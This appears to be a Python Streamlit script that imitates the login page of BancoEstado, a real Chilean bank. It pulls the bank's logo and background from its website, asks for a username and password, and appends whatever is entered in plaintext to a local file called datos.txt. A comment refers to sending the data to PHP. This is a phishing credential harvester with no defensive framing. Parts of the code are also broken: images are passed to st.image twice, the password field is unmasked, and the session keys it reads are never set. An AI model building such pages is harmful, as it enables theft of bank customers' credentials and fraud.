import streamlit as st

# Importar imágenes

img_logo = st.image("https://www.bancoestado.cl/content/bancoestado-public/cl/es/home/home.html#/images/logo.svg")
img_fondo = st.image("https://www.bancoestado.cl/content/bancoestado-public/cl/es/home/home.html#/images/fondo.svg")

# Importar CSS

css = """
body {
  background-image: url(https://www.bancoestado.cl/content/bancoestado-public/cl/es/home/home.html#/images/fondo.svg);
  background-repeat: no-repeat;
  background-position: center;
}

.container {
  width: 400px;
  margin: 0 auto;
}

.titulo {
  font-size: 2em;
  font-weight: bold;
  margin-bottom: 20px;
}

.input {
  width: 100%;
  padding: 10px;
  border: 1px solid #ccc;
  margin-bottom: 10px;
}

.boton {
  background-color: #000;
  color: #fff;
  padding: 10px;
  border: none;
  cursor: pointer;
}
"""

st.markdown(css, unsafe_allow_html=True)

# Crear la interfaz de usuario

with st.container():
  st.image(img_logo)
  st.markdown("<h1 class='titulo'>Inicio de sesión</h1>", unsafe_allow_html=True)
  st.text_input("Usuario", placeholder="Ingrese su usuario")
  st.text_input("Contraseña", placeholder="Ingrese su contraseña")
  st.button("Iniciar sesión")

# Enviar datos a PHP

def enviar_datos(usuario, contraseña):
  with open("datos.txt", "a") as f:
    f.write(f"{usuario}, {contraseña}\n")

if st.button("Enviar datos"):
  enviar_datos(st.session_state.usuario, st.session_state.contraseña)